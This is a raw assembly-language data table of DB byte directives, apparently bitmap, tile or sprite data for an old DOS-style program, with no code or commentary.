DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H
DB 01CH,003H,01BH,003H,000H,000H,000H,000H,000H,000H,000H,009H,00EH,013H,013H
DB 010H,014H,011H,014H,014H,013H,014H,013H,014H,011H,014H,014H,013H,014H,011H
DB 014H,013H,002H,000H,000H,000H,000H,000H,013H,014H,002H,010H,010H,010H,010H
DB 010H,00EH,00EH,00EH,00EH,00EH,00EH,00EH,00EH,00EH,00EH,00EH,007H,007H,007H
DB 007H,007H,007H,007H,007H,007H,007H,006H,006H,007H,007H,007H,007H,00DH,007H
DB 007H,006H,006H,008H,000H,000H,000H,000H,000H,01BH,003H,01BH,003H,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,001H,011H
DB 00AH,00AH,007H,008H,005H,005H,001H,009H,001H,009H,001H,009H,001H,009H,001H
DB 004H,004H,005H,005H,008H,007H,00AH,004H,000H,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,003H,00AH,006H,008H,005H,005H,004H,001H,004H,001H,009H
DB 001H,009H,002H,009H,001H,009H,001H,004H,004H,005H,008H,007H,00AH,00AH,00AH
DB 000H,01BH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,01BH,003H,01BH,000H
DB 000H,000H,000H,000H,000H,000H,000H,013H,014H,014H,014H,014H,013H,014H,014H
DB 014H,014H,014H,014H,014H,014H,014H,011H,014H,014H,014H,011H,011H,014H,014H
DB 008H,000H,000H,000H,000H,014H,016H,013H,012H,012H,00FH,012H,012H,012H,010H
DB 010H,007H,010H,010H,00EH,00EH,00EH,007H,007H,012H,012H,012H,010H,006H,00FH
DB 007H,007H,006H,00FH,006H,006H,006H,006H,006H,006H,006H,00DH,00DH,006H,007H
DB 007H,006H,007H,008H,009H,01BH,003H,01BH,003H,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,01BH,007H,011H,00AH,006H,007H
DB 008H,005H,001H,009H,001H,009H,001H,009H,001H,009H,001H,009H,001H,004H,004H
DB 005H,008H,008H,006H,006H,000H,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 003H,002H,00AH,007H,008H,005H,005H,004H,004H,001H,009H,002H,009H,002H,009H
DB 002H,009H,001H,009H,001H,004H,005H,008H,007H,006H,00AH,011H,002H,003H,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,003H,01BH,003H,000H,000H,000H,000H,000H,000H
DB 000H,000H,002H,00EH,014H,013H,014H,014H,014H,014H,013H,013H,014H,014H,014H
DB 014H,014H,014H,014H,014H,011H,014H,014H,014H,011H,011H,014H,013H,004H,000H
DB 000H,000H,014H,016H,012H,010H,00FH,00FH,013H,013H,00FH,012H,010H,010H,010H
DB 010H,010H,010H,010H,012H,00FH,00FH,00FH,010H,006H,006H,006H,00FH,00DH,00FH
DB 00FH,006H,006H,00FH,00FH,00FH,00FH,006H,00FH,006H,006H,006H,006H,007H,007H
DB 007H,006H,00EH,002H,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,003H,00AH,00AH,00AH,007H,008H,005H,004H,009H
DB 001H,009H,001H,009H,002H,009H,001H,009H,001H,009H,001H,004H,004H,005H,008H
DB 007H,00AH,003H,01BH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,005H,00AH
DB 007H,008H,005H,004H,004H,001H,009H,002H,009H,002H,009H,002H,009H,002H,009H
DB 001H,009H,001H,005H,005H,008H,006H,00AH,011H,009H,000H,003H,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 003H,01CH,003H,01BH,003H,000H,000H,000H,000H,000H,000H,000H,008H,013H,014H
DB 014H,014H,014H,013H,013H,014H,014H,014H,014H,014H,014H,014H,011H,011H,011H
DB 011H,014H,014H,014H,014H,014H,014H,011H,011H,014H,00EH,001H,000H,000H,013H
DB 014H,010H,013H,013H,013H,013H,014H,013H,00FH,010H,010H,010H,012H,010H,00EH
DB 010H,012H,00FH,00FH,012H,010H,012H,010H,012H,00FH,00FH,006H,00DH,006H,006H
DB 006H,006H,00DH,00DH,006H,007H,006H,006H,006H,006H,006H,007H,007H,007H,007H
DB 006H,004H,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,003H,002H,011H,00AH,006H,007H,008H,005H,004H,001H,009H,002H,009H
DB 002H,009H,002H,009H,002H,009H,001H,009H,001H,004H,005H,008H,007H,00AH,001H
DB 003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,005H,00AH,008H,008H,005H
DB 004H,001H,009H,001H,009H,002H,002H,002H,009H,002H,009H,002H,009H,001H,009H
DB 004H,005H,008H,006H,00AH,011H,004H,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,01BH,003H,01BH
DB 003H,000H,000H,000H,000H,000H,000H,000H,013H,014H,014H,013H,014H,013H,014H
DB 014H,014H,014H,014H,014H,014H,014H,014H,013H,014H,014H,014H,014H,014H,013H
DB 014H,014H,014H,014H,00FH,013H,013H,010H,005H,002H,009H,010H,012H,00FH,014H
DB 013H,014H,014H,014H,013H,014H,00FH,012H,012H,00FH,00FH,012H,010H,00FH,013H
DB 00AH,013H,00FH,00FH,00FH,00FH,00FH,00FH,00FH,010H,00FH,00FH,00FH,00DH,00DH
DB 00DH,006H,00DH,007H,007H,006H,007H,007H,00EH,007H,007H,00EH,007H,006H,004H
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 00BH,011H,00AH,006H,007H,008H,005H,001H,009H,002H,009H,002H,009H,002H,009H
DB 002H,009H,002H,009H,001H,009H,004H,005H,008H,007H,00AH,005H,01BH,003H,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,008H,00AH,007H,008H,005H,004H,004H,004H
DB 005H,005H,004H,001H,002H,002H,009H,002H,009H,001H,009H,001H,004H,005H,008H
DB 007H,00AH,011H,005H,01BH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,01BH,003H,01BH,003H,000H,000H,000H
DB 000H,000H,000H,000H,005H,014H,014H,014H,013H,013H,013H,013H,014H,014H,013H
DB 00FH,00FH,013H,013H,00FH,012H,014H,014H,00FH,010H,00DH,00DH,00DH,00DH,00DH
DB 00DH,00DH,010H,00DH,010H,00EH,00EH,00EH,00DH,013H,00FH,014H,011H,011H,014H
DB 013H,013H,014H,013H,013H,013H,013H,013H,00FH,00FH,00FH,013H,013H,014H,013H
DB 013H,00FH,00FH,00FH,00FH,00FH,00FH,00FH,013H,00FH,00FH,00FH,00FH,00FH,00FH
DB 006H,006H,00FH,00FH,006H,007H,007H,007H,007H,007H,008H,009H,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,005H,011H,00AH
DB 006H,008H,005H,004H,009H,001H,009H,002H,009H,002H,009H,002H,009H,001H,004H
DB 004H,004H,001H,004H,005H,008H,008H,00AH,005H,003H,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,005H,00AH,007H,008H,005H,004H,005H,008H,007H,006H,007H
DB 005H,002H,009H,002H,009H,002H,009H,001H,009H,001H,005H,008H,007H,00AH,011H
DB 005H,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,003H,01BH,003H,01BH,003H,000H,000H,000H,000H,000H,000H,008H
DB 013H,013H,014H,014H,013H,014H,013H,013H,013H,013H,013H,013H,013H,013H,013H
DB 013H,013H,013H,014H,014H,013H,00EH,00CH,00CH,00CH,00CH,00CH,00CH,00CH,00CH
DB 00CH,00CH,00DH,00DH,00DH,00DH,00DH,00DH,011H,015H,011H,014H,014H,014H,014H
DB 014H,013H,014H,014H,013H,013H,00FH,00FH,013H,014H,014H,014H,013H,013H,013H
DB 013H,013H,013H,00FH,013H,00FH,00FH,00FH,00FH,00FH,014H,005H,005H,00EH,007H
DB 005H,005H,008H,005H,001H,009H,002H,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,005H,011H,00AH,007H,008H,005H
DB 004H,001H,009H,002H,009H,002H,009H,002H,009H,004H,008H,008H,007H,008H,005H
DB 004H,005H,008H,007H,00AH,008H,01BH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,00BH,00AH,007H,008H,005H,004H,005H,006H,00AH,00AH,007H,005H,009H,002H
DB 009H,002H,009H,001H,009H,001H,004H,004H,008H,007H,00AH,00AH,009H,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H
DB 01BH,003H,01BH,003H,000H,000H,000H,000H,000H,002H,013H,014H,013H,012H,012H
DB 013H,012H,00FH,00FH,013H,013H,013H,013H,013H,013H,013H,013H,013H,013H,013H
DB 013H,014H,00FH,00CH,016H,018H,018H,018H,018H,018H,018H,018H,018H,018H,014H
DB 00FH,018H,019H,015H,00DH,011H,014H,005H,008H,012H,013H,014H,014H,014H,013H
DB 013H,014H,014H,00FH,012H,012H,00FH,014H,013H,00FH,013H,010H,004H,00EH,00EH
DB 010H,008H,003H,01CH,009H,01CH,003H,01CH,01CH,01CH,003H,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,001H,011H,00AH,007H,008H,005H,004H,009H,001H
DB 009H,002H,009H,002H,009H,001H,008H,007H,006H,00AH,006H,008H,005H,005H,008H
DB 007H,00AH,001H,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,00AH
DB 007H,008H,005H,005H,005H,007H,006H,006H,007H,005H,002H,009H,002H,009H,001H
DB 009H,001H,004H,004H,005H,008H,007H,00AH,00AH,01BH,003H,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,003H,01CH,003H,01CH,003H,01CH,003H,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,01BH,003H,01BH,003H
DB 01BH,003H,01BH,000H,01BH,005H,013H,014H,014H,013H,013H,013H,013H,013H,013H
DB 013H,013H,014H,014H,014H,013H,014H,014H,014H,013H,013H,013H,014H,014H,00FH
DB 00CH,018H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,015H,013H,01AH,01AH
DB 018H,00EH,014H,014H,010H,009H,000H,000H,000H,000H,000H,000H,000H,01BH,002H
DB 002H,002H,01BH,003H,01BH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,003H,01CH,003H,01CH,003H,01CH,003H,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,003H,00AH,00AH,007H,008H,005H,004H,001H,009H,001H,009H,002H
DB 009H,002H,009H,005H,007H,00AH,00AH,006H,008H,005H,005H,008H,007H,00AH,002H
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,007H,006H,008H,008H
DB 005H,005H,008H,007H,007H,005H,001H,009H,001H,009H,001H,009H,001H,004H,001H
DB 004H,005H,008H,006H,00AH,008H,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,003H,01BH,003H,01BH,003H,01BH,003H,01BH,003H,01CH,003H,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,01BH,003H,01BH,003H,01BH,003H
DB 004H,013H,013H,013H,013H,013H,013H,013H,013H,012H,013H,014H,013H,013H,014H
DB 014H,014H,014H,013H,014H,011H,013H,010H,010H,014H,014H,010H,00CH,018H,01AH
DB 01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,015H,013H,01AH,01AH,018H,00CH,014H
DB 015H,015H,015H,014H,002H,000H,000H,000H,000H,000H,000H,000H,003H,01BH,003H
DB 01BH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,01CH,003H,01BH
DB 003H,01BH,003H,01BH,003H,01BH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,006H,00AH,007H,008H,005H,004H,004H,001H,009H,001H,009H,002H,009H,002H
DB 004H,008H,007H,006H,007H,005H,005H,008H,008H,006H,006H,01BH,003H,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,00BH,00AH,007H,008H,005H,005H,004H
DB 005H,005H,001H,009H,001H,009H,001H,009H,001H,004H,001H,004H,005H,005H,008H
DB 006H,00AH,009H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,01BH,003H
DB 01BH,003H,000H,000H,000H,000H,01BH,003H,01BH,003H,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,003H,01BH,003H,01BH,003H,01BH,003H,005H,013H,013H,013H
DB 013H,012H,013H,013H,013H,014H,014H,013H,014H,014H,013H,013H,014H,013H,005H
DB 004H,012H,010H,001H,000H,000H,002H,000H,002H,00CH,018H,01AH,01AH,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,015H,013H,01AH,01AH,018H,00DH,010H,015H,015H,015H
DB 015H,015H,010H,000H,000H,000H,000H,000H,000H,000H,000H,01BH,003H,01BH,003H
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,01BH,003H,01BH,003H,000H,000H,000H
DB 000H,000H,003H,01BH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,005H,011H
DB 006H,008H,005H,005H,004H,004H,001H,009H,001H,009H,001H,009H,001H,004H,008H
DB 008H,005H,005H,005H,008H,007H,00AH,005H,003H,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,006H,00AH,007H,008H,005H,005H,004H,004H,004H
DB 001H,009H,001H,009H,001H,004H,004H,004H,004H,005H,008H,008H,00AH,006H,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,01BH,003H,000H,000H,01BH,003H
DB 000H,000H,000H,000H,000H,003H,01BH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,003H,01CH,003H,01BH,009H,012H,013H,012H,012H,013H,013H,013H,013H
DB 012H,012H,008H,009H,01CH,008H,005H,003H,01CH,003H,01BH,003H,01BH,003H,000H
DB 000H,000H,000H,000H,000H,000H,00CH,018H,01AH,01AH,01AH,01AH,01AH,01AH,01AH
DB 01AH,01AH,015H,013H,01AH,01AH,018H,00DH,00FH,012H,015H,015H,011H,011H,011H
DB 013H,002H,000H,000H,000H,000H,000H,000H,000H,01BH,003H,01BH,003H,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,003H,01BH,003H,01BH,000H,000H,000H,01BH,003H,000H,000H,000H
DB 000H,000H,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,00AH,00AH,007H,008H
DB 005H,005H,004H,004H,001H,009H,001H,009H,001H,009H,001H,004H,004H,004H,005H
DB 005H,008H,006H,00AH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,002H,00AH,006H,008H,008H,005H,005H,004H,004H,004H,004H,004H
DB 004H,004H,004H,005H,005H,005H,008H,008H,006H,00AH,002H,003H,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,003H,01BH,003H,01BH,008H,006H,006H,00AH,00AH,00AH,008H
DB 002H,000H,000H,000H,01BH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,010H,013H,012H,013H,013H,013H,010H,012H,012H,001H,003H,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,01BH,003H,000H,000H,000H,000H,000H
DB 000H,000H,002H,00CH,018H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,016H
DB 013H,01AH,01AH,018H,00DH,014H,00FH,012H,015H,015H,011H,011H,011H,014H,013H
DB 004H,000H,000H,000H,000H,000H,000H,01BH,003H,01BH,003H,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H
DB 01BH,003H,000H,000H,004H,006H,00AH,00AH,00AH,006H,007H,004H,01BH,000H,000H
DB 003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,008H,00AH,007H,008H,005H,005H,005H
DB 004H,004H,001H,004H,001H,004H,001H,004H,004H,004H,005H,005H,008H,007H,00AH
DB 005H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,004H,00AH,007H,008H,008H,005H,005H,005H,004H,004H,004H,004H,004H,005H
DB 005H,005H,008H,008H,007H,00AH,004H,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 003H,01BH,003H,004H,006H,006H,007H,007H,007H,006H,00AH,00AH,011H,007H,000H
DB 000H,000H,01BH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,002H,012H,013H
DB 012H,00EH,004H,001H,003H,01CH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,003H,01BH,003H,000H,000H,000H,000H,000H,000H,002H,008H,00EH
DB 00CH,018H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,016H,013H,01AH,01AH
DB 018H,00EH,014H,011H,00FH,00FH,015H,011H,011H,011H,011H,011H,014H,013H,002H
DB 000H,000H,000H,000H,000H,000H,003H,01BH,003H,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,000H,004H
DB 00AH,011H,00AH,006H,007H,007H,007H,006H,00AH,006H,004H,000H,000H,003H,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,006H,00AH,007H,008H,005H,005H,005H,004H,004H
DB 004H,004H,004H,004H,004H,005H,005H,005H,008H,008H,00AH,007H,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,008H
DB 00AH,006H,007H,008H,008H,005H,005H,005H,005H,005H,005H,005H,008H,008H,008H
DB 007H,00AH,007H,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,01BH,003H,007H
DB 00AH,007H,008H,005H,005H,005H,008H,008H,007H,00AH,011H,00AH,002H,000H,000H
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,002H,012H,008H,009H,01CH,003H,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H
DB 01BH,003H,000H,000H,000H,000H,000H,000H,008H,013H,010H,00EH,00CH,018H,01AH
DB 01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,016H,013H,01AH,01AH,018H,00CH,005H
DB 014H,011H,010H,013H,015H,011H,011H,011H,011H,014H,014H,014H,009H,000H,000H
DB 000H,000H,000H,000H,003H,01BH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,01BH,008H,011H,00AH,006H,007H
DB 008H,005H,005H,005H,008H,008H,007H,00AH,001H,000H,000H,003H,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,006H,00AH,007H,008H,008H,005H,005H,005H,005H,005H,005H
DB 005H,005H,005H,008H,008H,008H,006H,00AH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,005H,00AH,00AH
DB 007H,008H,008H,008H,008H,008H,008H,008H,008H,008H,007H,006H,00AH,007H,003H
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,01BH,003H,007H,00AH,008H,008H,005H
DB 005H,004H,005H,004H,005H,008H,007H,006H,00AH,00AH,000H,000H,003H,01CH,01CH
DB 01CH,01CH,01CH,01CH,002H,008H,01CH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,01BH,003H,000H,000H
DB 000H,000H,000H,000H,000H,013H,012H,010H,00EH,00CH,018H,01AH,01AH,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,016H,013H,01AH,01AH,018H,00CH,000H,014H,011H,011H
DB 00EH,011H,015H,011H,011H,011H,014H,014H,014H,014H,010H,002H,000H,000H,000H
DB 000H,000H,003H,01BH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,003H,01BH,005H,011H,00AH,006H,008H,008H,005H,004H,005H
DB 005H,005H,005H,008H,007H,006H,002H,000H,01BH,003H,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,006H,00AH,007H,008H,008H,008H,005H,005H,005H,005H,005H,008H,008H
DB 008H,007H,006H,00AH,002H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,001H,006H,00AH,006H,007H
